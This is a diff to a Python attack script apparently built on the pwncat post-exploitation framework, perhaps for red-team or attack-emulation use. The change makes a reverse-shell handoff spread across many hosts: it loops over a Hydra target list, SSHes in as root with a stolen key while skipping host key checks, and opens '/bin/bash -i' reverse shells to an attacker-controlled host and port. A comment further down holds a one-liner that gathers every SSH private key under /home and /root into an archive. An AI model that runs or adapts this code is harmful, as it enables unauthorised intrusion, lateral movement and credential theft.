@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import base64
 import os
+from uu import encode
 import pwncat.manager
 from pwncat.channel import ChannelError
 import subprocess
@@ -105,7 +106,7 @@ def execute(session: pwncat.manager.Session, task):
             # ideally we determine the key using the ssh_keys archive paths
             # and enumerate? but for now we will have to _cheat_ a little
 
-            ssh_paylod = f'ssh -o StrictHostKeyChecking=accept-new -i ~/.ssh/secret_key root@{ssh_targets[0]} "nohup /bin/bash -c \"TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1\" >/dev/null 2>&1 &"'
+            ssh_paylod = f'for h in $(cat /tmp/hydra-targets.txt | grep -v $(ip -o -f inet addr show | awk \'/scope global/ {{print $4}}\' | head -1 | awk -F \'/\' \'{{ print $1 }}\')); do ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ~/.ssh/secret_key root@$h "nohup /bin/bash -c \"TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1\" >/dev/null 2>&1 &"; done"'
             session.log(
                 f"starting reverse shell hand off on remote host off via ssh: {ssh_paylod}")
             result = session.platform.run(
@@ -304,6 +305,9 @@ for user in users:
     # stop user enumeration
     if success:
         break
+
+
+exit(0)
 
 # archive all private keys
 # rm /tmp/ssh_keys.tar /tmp/ssh_keys.tgz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do; if grep "PRIVATE" $f>/dev/null; then tar -rvf /tmp/ssh_keys.tar $f; fi done && gzip /tmp/ssh_keys.tar > /tmp/ssh_keys.tgz
